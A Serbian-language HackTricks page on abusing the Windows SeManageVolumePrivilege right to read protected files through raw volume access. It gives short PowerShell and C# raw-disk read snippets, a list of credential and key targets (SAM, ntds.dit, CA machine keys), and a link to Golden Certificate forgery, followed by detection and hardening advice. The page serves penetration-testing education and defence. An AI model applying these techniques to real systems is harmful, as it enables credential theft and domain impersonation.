# SeManageVolumePrivilege: Sirovi pristup volumenu za proizvoljno čitanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Windows korisničko pravo: Perform volume maintenance tasks (konstanta: SeManageVolumePrivilege).

Nositelji mogu da izvršavaju niskonivojske operacije nad volumenom kao što su defragmentacija, kreiranje/brisanje volumena i maintenance I/O. Kritično za napadače, ovo pravo omogućava otvaranje sirovih handle-ova uređaja volumena (npr. \\.\C:) i izdavanje direktnog disk I/O koji zaobilazi NTFS file ACLs. Sa sirovim pristupom možete kopirati bajtove bilo kog fajla na volumenu čak i ako je pristup odbijen od strane DACL, parsiranjem struktura fajl sistema offline ili korišćenjem alata koji čitaju na nivou blokova/klastera.

Podrazumevano: Administratori na serverima i kontrolerima domena.

## Slučajevi zloupotrebe

- Proizvoljno čitanje fajlova zaobilazeći ACLs čitanjem disk uređaja (npr., exfiltrate osetljivog sistemom zaštićenog materijala kao što su machine private keys under %ProgramData%\Microsoft\Crypto\RSA\MachineKeys and %ProgramData%\Microsoft\Crypto\Keys, registry hives, DPAPI masterkeys, SAM, ntds.dit via VSS, itd.).
- Zaobiđite zaključane/privilegovane putanje (C:\Windows\System32\…) kopiranjem bajtova direktno sa sirovog uređaja.
- U AD CS okruženjima, exfiltrate CA’s key material (machine key store) kako biste izradili “Golden Certificates” i imitirali bilo kog domen principala putem PKINIT. Pogledajte link ispod.

Napomena: I dalje vam je potreban parser za NTFS strukture osim ako se ne oslanjate na pomoćne alate. Mnogi gotovi alati apstrahuju sirovi pristup.

## Praktične tehnike

- Open a raw volume handle and read clusters:

<details>
<summary>Kliknite za proširenje</summary>
```powershell
# PowerShell – read first MB from C: raw device (requires SeManageVolumePrivilege)
$fs = [System.IO.File]::Open("\\.\\C:",[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] (1MB)
$null = $fs.Read($buf,0,$buf.Length)
$fs.Close()
[IO.File]::WriteAllBytes("C:\\temp\\c_first_mb.bin", $buf)
```

```csharp
// C# (compile with Add-Type) – read an arbitrary offset of \\.\nusing System;
using System.IO;
class R {
static void Main(string[] a){
using(var fs = new FileStream("\\\\.\\C:", FileMode.Open, FileAccess.Read, FileShare.ReadWrite)){
fs.Position = 0x100000; // seek
var buf = new byte[4096];
fs.Read(buf,0,buf.Length);
File.WriteAllBytes("C:\\temp\\blk.bin", buf);
}
}
}
```
</details>

- Koristite NTFS-aware alat za oporavak određenih fajlova sa raw volumena:
- RawCopy/RawCopy64 (kopija na nivou sektora fajlova koji su u upotrebi)
- FTK Imager or The Sleuth Kit (imaging samo za čitanje, pa zatim carve-ovanje fajlova)
- vssadmin/diskshadow + shadow copy, zatim kopirajte ciljnu datoteku iz snapshot-a (ako možete da kreirate VSS; često zahteva admin prava ali je obično dostupno istim operatorima koji imaju SeManageVolumePrivilege)

Tipične osetljive putanje za ciljanje:
- %ProgramData%\Microsoft\Crypto\RSA\MachineKeys\
- %ProgramData%\Microsoft\Crypto\Keys\
- C:\Windows\System32\config\SAM, SYSTEM, SECURITY (local secrets)
- C:\Windows\NTDS\ntds.dit (domain controllers – via shadow copy)
- C:\Windows\System32\CertSrv\CertEnroll\ (CA certs/CRLs; private keys live in the machine key store above)

## Veza sa AD CS: Forging a Golden Certificate

Ako možete da pročitate privatni ključ Enterprise CA iz machine key store, možete da falsifikujete client‑auth certificates za proizvoljne principe i autentifikujete se preko PKINIT/Schannel. Ovo se često naziva Golden Certificate. Pogledajte:

{{#ref}}
../active-directory-methodology/ad-certificates/domain-persistence.md
{{#endref}}

(Sekcija: “Forging Certificates with Stolen CA Certificates (Golden Certificate) – DPERSIST1”).

## Detekcija i zaštita

- Snažno ograničiti dodeljivanje SeManageVolumePrivilege (Perform volume maintenance tasks) samo pouzdanim administratorima.
- Pratiti Sensitive Privilege Use i otvaranja process handle-a prema uređajskim objektima kao što su \\.\C:, \\.\PhysicalDrive0.
- Preferirajte HSM/TPM-backed CA ključeve ili DPAPI-NG tako da čitanje raw fajlova ne može da povrati materijal ključeva u upotrebljivom obliku.
- Držite upload, temp i extraction putanje neizvršnim i odvojenim (odbrana u web kontekstu koja se često kombinuje sa ovim lancem post‑eksploatacije).

## Izvori

- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege used to read CA key → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
